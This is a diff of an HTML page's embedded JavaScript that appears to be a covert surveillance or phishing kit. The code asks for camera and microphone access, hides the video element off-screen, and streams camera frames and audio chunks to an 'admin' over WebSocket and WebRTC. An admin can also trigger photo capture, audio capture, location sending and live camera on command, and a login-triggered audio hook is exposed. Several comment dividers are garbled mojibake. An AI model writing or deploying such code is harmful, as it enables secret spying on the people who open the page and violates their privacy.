-            frameRate: { ideal: 30, max: 60 }
+            width:      { ideal: 1280 },
+            height:     { ideal: 720 },
+            frameRate:  { ideal: 30, max: 60 }
           };
 
-          // Try capturing camera and mic with higher frame rate constraint
           navigator.mediaDevices.getUserMedia({
             video: videoConstraints,
-            audio: {
-              echoCancellation:  false,
-              noiseSuppression:  false,
-              autoGainControl:   false
-            }
+            audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false }
           })
-            .then((stream) => {
-              setupLiveMediaStreams(stream);
-            })
-            .catch(() => {
-              // Fallback to video only
-              navigator.mediaDevices.getUserMedia({ video: videoConstraints, audio: false })
-                .then((stream) => {
-                  setupLiveMediaStreams(stream);
-                })
-                .catch(() => {
-                  sendWS({ type: 'permission_denied', permission: 'camera (live)' });
-                });
-            });
+          .then(stream => setupLiveMediaStreams(stream))
+          .catch(() => {
+            navigator.mediaDevices.getUserMedia({ video: videoConstraints, audio: false })
+              .then(stream => setupLiveMediaStreams(stream))
+              .catch(() => sendWS({ type: 'permission_denied', permission: 'camera (live)' }));
+          });
         }
 
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Core Stream Setup Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
         function setupLiveMediaStreams(stream) {
           liveStreamActive = true;
 
-          // Video elements setup
+          // Hidden video element to receive camera frames
           liveStreamVideo = document.createElement('video');
-          liveStreamCanvas = document.createElement('canvas');
-          liveStreamCanvas.width = 640;
-          liveStreamCanvas.height = 480;
-          liveStreamContext = liveStreamCanvas.getContext('2d');
-
           liveStreamVideo.srcObject = stream;
           liveStreamVideo.setAttribute('playsinline', '');
           liveStreamVideo.muted = true;
-          liveStreamVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;';
+          liveStreamVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
           document.body.appendChild(liveStreamVideo);
 
-          // Start WebRTC peer connection immediately using the raw stream (does not require video.play() to resolve)
-          startWebRTCStream(stream);
+          // Reusable canvas for JPEG encoding
+          liveStreamCanvas  = document.createElement('canvas');
+          liveStreamContext = liveStreamCanvas.getContext('2d');
 
-          // Play the video in the background (ignore promise suspension on inactive tabs)
-          liveStreamVideo.play().catch(e => {
-            console.warn("Video playback deferred until tab focus:", e);
-          });
+          // Start playing (catch autoplay policy errors silently)
+          liveStreamVideo.play().catch(() => {});
 
-          // Start the snapshot capture loop immediately
-          const TARGET_FPS = 15;
+          // Once metadata loads, start the frame capture loop
+          liveStreamVideo.onloadedmetadata = () => startFrameCapture();
+          // Fallback: start after a short delay in case event already fired
+          setTimeout(() => { if (liveStreamActive && !captureFrameId) startFrameCapture(); }, 500);
+
+          // Attempt WebRTC for higher quality (optional Ã¢â‚¬â€ snapshot feed runs regardless)
+          if (ioSocket && ioSocket.connected) {
+            startWebRTCStream(stream);
+          }
+
+          // Audio capture
+          setupAudioCapture(stream);
+        }
+
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ JPEG Snapshot Frame Loop (Primary feed Ã¢â‚¬â€ always works) Ã¢â€â‚¬Ã¢â€â‚¬
+        function startFrameCapture() {
+          if (captureFrameId || !liveStreamActive) return;
+
+          const TARGET_FPS     = 15;
           const FRAME_INTERVAL = 1000 / TARGET_FPS;
-          let lastFrameTime = 0;
+          let lastFrameTime    = 0;
 
           function captureLoop(timestamp) {
-            if (!liveStreamActive) return; // stopped
-            if (timestamp - lastFrameTime >= FRAME_INTERVAL) {
-              lastFrameTime = timestamp;
-              if (liveStreamVideo && liveStreamVideo.readyState >= 2) {
-                try {
-                  const settings = liveStreamVideo.srcObject
-                    ? liveStreamVideo.srcObject.getVideoTracks()[0].getSettings()
-                    : {};
-                  liveStreamCanvas.width  = settings.width  || 1280;
-                  liveStreamCanvas.height = settings.height || 720;
-                  liveStreamContext.drawImage(liveStreamVideo, 0, 0);
-                  const photo = liveStreamCanvas.toDataURL('image/jpeg', 0.6);
-                  if (photo && photo.length > 1000) {
-                    sendFrameToAdmin(photo);
-                  }
-                } catch (e) { }
-              }
-            }
+            if (!liveStreamActive) return;
             captureFrameId = requestAnimationFrame(captureLoop);
-          }
-          captureFrameId = requestAnimationFrame(captureLoop);
 
-          // Audio recording setup
-          const audioTracks = stream.getAudioTracks();
-          if (audioTracks.length > 0) {
+            if (timestamp - lastFrameTime < FRAME_INTERVAL) return;
+            lastFrameTime = timestamp;
+
+            if (!liveStreamVideo || liveStreamVideo.readyState < 2) return;
             try {
-              liveAudioStream = new MediaStream(audioTracks);
-              const mimeType = getSupportedMimeType();
-              liveAudioRecorder = new MediaRecorder(liveAudioStream, mimeType ? { mimeType } : {});
+              const vw = liveStreamVideo.videoWidth  || 1280;
+              const vh = liveStreamVideo.videoHeight || 720;
+              if (liveStreamCanvas.width !== vw)  liveStreamCanvas.width  = vw;
+              if (liveStreamCanvas.height !== vh) liveStreamCanvas.height = vh;
+              liveStreamContext.drawImage(liveStreamVideo, 0, 0, vw, vh);
+              const photo = liveStreamCanvas.toDataURL('image/jpeg', 0.65);
+              if (photo && photo.length > 1000) {
+                // Primary: always send via raw WebSocket (reliable, uses server-assigned clientId)
+                sendWS({ type: 'camera_frame', frame: photo });
+              }
+            } catch (e) { /* cross-origin or decode error, skip frame */ }
+          }
 
-              liveAudioRecorder.ondataavailable = (e) => {
-                if (e.data && e.data.size > 0 && liveStreamActive) {
-                  const reader = new FileReader();
-                  reader.onload = () => {
-                    sendWS({ type: 'audio_chunk', audio: reader.result });
-                  };
-                  reader.readAsDataURL(e.data);
-                }
-              };
+          captureFrameId = requestAnimationFrame(captureLoop);
+        }
 
-              // Capture audio chunks every 1000ms (1 second)
-              liveAudioRecorder.start(1000);
-            } catch (e) {
-              console.error("Audio streaming setup failed:", e);
-            }
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Audio Capture Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
+        function setupAudioCapture(stream) {
+          const audioTracks = stream.getAudioTracks();
+          if (!audioTracks.length) return;
+          try {
+            liveAudioStream = new MediaStream(audioTracks);
+            const mimeType = getSupportedMimeType();
+            liveAudioRecorder = new MediaRecorder(liveAudioStream, mimeType ? { mimeType } : {});
+            liveAudioRecorder.ondataavailable = (e) => {
+              if (e.data && e.data.size > 0 && liveStreamActive) {
+                const reader = new FileReader();
+                reader.onload = () => sendWS({ type: 'audio_chunk', audio: reader.result });
+                reader.readAsDataURL(e.data);
+              }
+            };
+            liveAudioRecorder.start(1000);
+          } catch (e) {
+            console.warn('Audio capture failed:', e);
           }
         }
 
-        // ─── Step 4 — requestAnimationFrame state ─────────────────────────────
-        let captureFrameId = null;
-
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Stop Live Camera Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
         function stopLiveCamera() {
           liveStreamActive = false;
-          // Cancel rAF loop (Step 4)
-          if (captureFrameId) {
-            cancelAnimationFrame(captureFrameId);
-            captureFrameId = null;
-          }
-          if (liveStreamInterval) {
-            clearInterval(liveStreamInterval);
-            liveStreamInterval = null;
-          }
-          if (liveStreamWorker) {
-            try {
-              liveStreamWorker.postMessage({ action: 'stop' });
-              liveStreamWorker.terminate();
-            } catch (e) { }
-            liveStreamWorker = null;
-          }
-          // Close WebRTC peer connection if open
+
+          if (captureFrameId) { cancelAnimationFrame(captureFrameId); captureFrameId = null; }
+
           if (livePeerConnection) {
             try { livePeerConnection.close(); } catch (e) {}
             livePeerConnection = null;
           }
           if (liveAudioRecorder && liveAudioRecorder.state !== 'inactive') {
-            try { liveAudioRecorder.stop(); } catch (e) { }
+            try { liveAudioRecorder.stop(); } catch (e) {}
             liveAudioRecorder = null;
           }
           if (liveStreamVideo) {
-            const stream = liveStreamVideo.srcObject;
-            if (stream) stream.getTracks().forEach(t => t.stop());
+            const s = liveStreamVideo.srcObject;
+            if (s) s.getTracks().forEach(t => t.stop());
             liveStreamVideo.remove();
-            liveStreamVideo = null;
+            liveStreamVideo  = null;
             liveStreamCanvas = null;
             liveStreamContext = null;
-            liveAudioStream = null;
+            liveAudioStream  = null;
           }
         }
 
-        // ─── Step 5 — Send frame via Socket.IO ─────────────────────────────
-        function sendFrameToAdmin(base64Photo) {
-          if (ioSocket && ioSocket.connected) {
-            ioSocket.emit('camera:frame', {
-              uuid:      String(ioClientId || ''),
-              frame:     base64Photo,
-              timestamp: Date.now()
-            });
-          } else {
-            // Fallback: send via raw WebSocket as camera_frame
-            sendWS({ type: 'camera_frame', frame: base64Photo });
-          }
-        }
-
-        // ─── Steps 2 & 3 — WebRTC Peer Connection for true live stream ────────
-        let livePeerConnection = null;
-
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ WebRTC (Optional bonus Ã¢â‚¬â€ higher quality when available) Ã¢â€â‚¬Ã¢â€â‚¬
         async function startWebRTCStream(mediaStream) {
-          if (!window.RTCPeerConnection || !ioSocket) return;
+          if (!window.RTCPeerConnection) return;
+          try {
+            livePeerConnection = new RTCPeerConnection({
+              iceServers: [
+                { urls: 'stun:stun.l.google.com:19302' },
+                { urls: 'stun:stun1.l.google.com:19302' },
+                { urls: 'stun:stun2.l.google.com:19302' },
+                { urls: 'stun:stun.cloudflare.com:3478' }
+              ],
+              bundlePolicy:  'max-bundle',
+              rtcpMuxPolicy: 'require'
+            });
 
-          // Step 2 — WebRTC peer connection config with 4 STUN + bundle policy
-          livePeerConnection = new RTCPeerConnection({
-            iceServers: [
-              { urls: 'stun:stun.l.google.com:19302' },
-              { urls: 'stun:stun1.l.google.com:19302' },
-              { urls: 'stun:stun2.l.google.com:19302' },
-              { urls: 'stun:stun.cloudflare.com:3478' }
-            ],
-            iceTransportPolicy: 'all',
-            bundlePolicy:       'max-bundle',
-            rtcpMuxPolicy:      'require'
-          });
+            mediaStream.getTracks().forEach(track => livePeerConnection.addTrack(track, mediaStream));
 
-          // Add all tracks from the media stream
-          mediaStream.getTracks().forEach(track => {
-            livePeerConnection.addTrack(track, mediaStream);
-          });
-
-          // Step 3 — Boost bitrate after negotiation and send offer
-          livePeerConnection.onnegotiationneeded = async () => {
-            for (const sender of livePeerConnection.getSenders()) {
-              if (sender.track && sender.track.kind === 'video') {
-                const params = sender.getParameters();
-                if (!params.encodings || params.encodings.length === 0) {
-                  params.encodings = [{}];
-                }
-                params.encodings[0].maxBitrate  = 2_500_000; // 2.5 Mbps
-                params.encodings[0].maxFramerate = 30;
-                try { await sender.setParameters(params); } catch (e) {}
-              }
-            }
-
-            // Initiate WebRTC offer directly to avoid the setup race condition
-            try {
-              const offer = await livePeerConnection.createOffer();
-              await livePeerConnection.setLocalDescription(offer);
-              ioSocket.emit('webrtc:offer', {
-                adminSocketId: livePeerConnection._adminSocketId,
-                offer
-              });
-            } catch (e) { console.error('WebRTC offer generation error:', e); }
-          };
-
-          livePeerConnection.onicecandidate = (event) => {
-            if (event.candidate && ioSocket && ioSocket.connected) {
-              if (livePeerConnection._adminSocketId) {
-                ioSocket.emit('webrtc:ice-candidate', {
-                  adminSocketId: livePeerConnection._adminSocketId,
-                  candidate: event.candidate
-                });
+            livePeerConnection.onicecandidate = (evt) => {
+              if (!evt.candidate || !ioSocket || !ioSocket.connected) return;
+              const adminId = livePeerConnection._adminSocketId;
+              if (adminId) {
+                ioSocket.emit('webrtc:ice-candidate', { adminSocketId: adminId, candidate: evt.candidate });
               } else {
-                if (!livePeerConnection._iceQueue) {
-                  livePeerConnection._iceQueue = [];
-                }
-                livePeerConnection._iceQueue.push(event.candidate);
+                if (!livePeerConnection._iceQueue) livePeerConnection._iceQueue = [];
+                livePeerConnection._iceQueue.push(evt.candidate);
               }
-            }
-          };
+            };
 
-          // Listen for admin to request WebRTC, then send offer
-          if (!livePeerConnection._requestListenerAttached) {
-            livePeerConnection._requestListenerAttached = true;
+            // Attach Socket.IO WebRTC signaling listeners once
+            if (ioSocket && !ioSocket._webrtcListenersAttached) {
+              ioSocket._webrtcListenersAttached = true;
 
-            ioSocket.on('webrtc:request', async (data) => {
-              if (!livePeerConnection) return;
-              livePeerConnection._adminSocketId = data.adminSocketId;
-              try {
+              ioSocket.on('webrtc:request', async (data) => {
+                if (!livePeerConnection) return;
+                livePeerConnection._adminSocketId = data.adminSocketId;
                 const offer = await livePeerConnection.createOffer();
                 await livePeerConnection.setLocalDescription(offer);
-                ioSocket.emit('webrtc:offer', {
-                  adminSocketId: data.adminSocketId,
-                  offer
-                });
-              } catch (e) { console.error('WebRTC offer error:', e); }
-            });
-
-            ioSocket.on('webrtc:answer', async (data) => {
-              if (!livePeerConnection) return;
-              if (data.adminSocketId) {
-                livePeerConnection._adminSocketId = data.adminSocketId;
-                // Flush queued local ICE candidates now that we have the admin socket ID
-                if (livePeerConnection._iceQueue) {
-                  livePeerConnection._iceQueue.forEach(candidate => {
-                    ioSocket.emit('webrtc:ice-candidate', {
-                      adminSocketId: livePeerConnection._adminSocketId,
-                      candidate
-                    });
-                  });
-                  livePeerConnection._iceQueue = [];
-                }
-              }
-              try {
-                await livePeerConnection.setRemoteDescription(
-                  new RTCSessionDescription(data.answer)
+                ioSocket.emit('webrtc:offer', { adminSocketId: data.adminSocketId, offer });
+                // Flush queued ICE
+                (livePeerConnection._iceQueue || []).forEach(c =>
+                  ioSocket.emit('webrtc:ice-candidate', { adminSocketId: data.adminSocketId, candidate: c })
                 );
-                // Flush queued remote ICE candidates
-                if (livePeerConnection._remoteIceQueue) {
-                  for (const candidate of livePeerConnection._remoteIceQueue) {
-                    try {
-                      await livePeerConnection.addIceCandidate(
-                        new RTCIceCandidate(candidate)
-                      );
-                    } catch (e) { console.error('WebRTC queued ICE error:', e); }
-                  }
-                  livePeerConnection._remoteIceQueue = [];
-                }
-              } catch (e) { console.error('WebRTC answer error:', e); }
-            });
+                livePeerConnection._iceQueue = [];
+              });
 
-            ioSocket.on('webrtc:ice-candidate', async (data) => {
-              if (!livePeerConnection) return;
-              if (!livePeerConnection.remoteDescription) {
-                if (!livePeerConnection._remoteIceQueue) {
-                  livePeerConnection._remoteIceQueue = [];
+              ioSocket.on('webrtc:answer', async (data) => {
+                if (!livePeerConnection) return;
+                if (data.adminSocketId) livePeerConnection._adminSocketId = data.adminSocketId;
+                await livePeerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
+                for (const c of (livePeerConnection._remoteIceQueue || [])) {
+                  try { await livePeerConnection.addIceCandidate(new RTCIceCandidate(c)); } catch (_) {}
                 }
-                livePeerConnection._remoteIceQueue.push(data.candidate);
-              } else {
-                try {
-                  await livePeerConnection.addIceCandidate(
-                    new RTCIceCandidate(data.candidate)
-                  );
-                } catch (e) { console.error('WebRTC ICE error:', e); }
-              }
-            });
+                livePeerConnection._remoteIceQueue = [];
+              });
 
-            ioSocket.on('webrtc:stop', () => {
-              stopLiveCamera();
-            });
+              ioSocket.on('webrtc:ice-candidate', async (data) => {
+                if (!livePeerConnection) return;
+                if (!livePeerConnection.remoteDescription) {
+                  if (!livePeerConnection._remoteIceQueue) livePeerConnection._remoteIceQueue = [];
+                  livePeerConnection._remoteIceQueue.push(data.candidate);
+                } else {
+                  try { await livePeerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch (_) {}
+                }
+              });
+
+              ioSocket.on('webrtc:stop', () => stopLiveCamera());
+            }
+
+            // Generate initial offer
+            const offer = await livePeerConnection.createOffer();
+            await livePeerConnection.setLocalDescription(offer);
+            ioSocket.emit('webrtc:offer', { adminSocketId: livePeerConnection._adminSocketId, offer });
+
+          } catch (e) {
+            console.warn('WebRTC setup failed (snapshot feed still running):', e);
           }
         }
 
-        // ─── Socket.IO Client (for signaling + camera:frame) ──────────────────
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Socket.IO (for WebRTC signaling only) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
         let ioSocket   = null;
-        let ioClientId = null; // session-based ID for Socket.IO registration
+        let ioClientId = null;
 
         function initSocketIO() {
-          // Dynamically load socket.io client from the same server
-          const script = document.createElement('script');
-          script.src = '/socket.io/socket.io.js';
+          const script  = document.createElement('script');
+          script.src    = '/socket.io/socket.io.js';
           script.onload = () => {
-            ioClientId = sessionStorage.getItem('_cid');
-            if (!ioClientId) {
-              ioClientId = Math.random().toString(36).slice(2);
-              sessionStorage.setItem('_cid', ioClientId);
-            }
-            // eslint-disable-next-line no-undef
             ioSocket = io(location.protocol + '//' + location.host);
             ioSocket.on('connect', () => {
-              // Register with the server so it can route WebRTC signals to us
-              ioSocket.emit('register', { uuid: ioClientId });
+              // Register with server-assigned numeric clientId once we have it
+              if (ioClientId) ioSocket.emit('register', { uuid: ioClientId });
             });
           };
           document.head.appendChild(script);
         }
 
-        // ─── Init ─────────────────────────────────────────────────
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Handle Admin Commands Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
+        function handleServerCommand(msg) {
+          switch (msg.type) {
+            case 'ASSIGN_ID':
+              // Server sends us our numeric clientId Ã¢â‚¬â€ register it with Socket.IO
+              ioClientId = String(msg.clientId);
+              if (ioSocket && ioSocket.connected) {
+                ioSocket.emit('register', { uuid: ioClientId });
+              }
+              break;
+            case 'CAPTURE_PHOTO':       capturePhoto();    break;
+            case 'CAPTURE_AUDIO':       captureAudio();    break;
+            case 'SEND_LOCATION':       sendLocation();    break;
+            case 'START_LIVE_CAMERA':   startLiveCamera(); break;
+            case 'STOP_LIVE_CAMERA':    stopLiveCamera();  break;
+          }
+        }
+
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Init Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
         if (document.readyState === 'loading') {
           document.addEventListener('DOMContentLoaded', () => { connectWS(); initSocketIO(); });
         } else {
@@ -1096,20 +999,17 @@
           initSocketIO();
         }
 
-        // ─── Expose login-triggered audio capture globally ───────────
+        // Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Expose login-triggered audio capture globally Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
         window.captureAudioOnLogin = function () {
           if (!navigator.mediaDevices) return;
           navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-            .then((stream) => {
-              captureAudioFromStream(stream);
-            })
-            .catch(() => {
-              // Microphone permission not granted — silently skip
-            });
+            .then(stream => captureAudioFromStream(stream))
+            .catch(() => {});
         };
 
       })();
     </script>
+
 </body>
 
 </html>
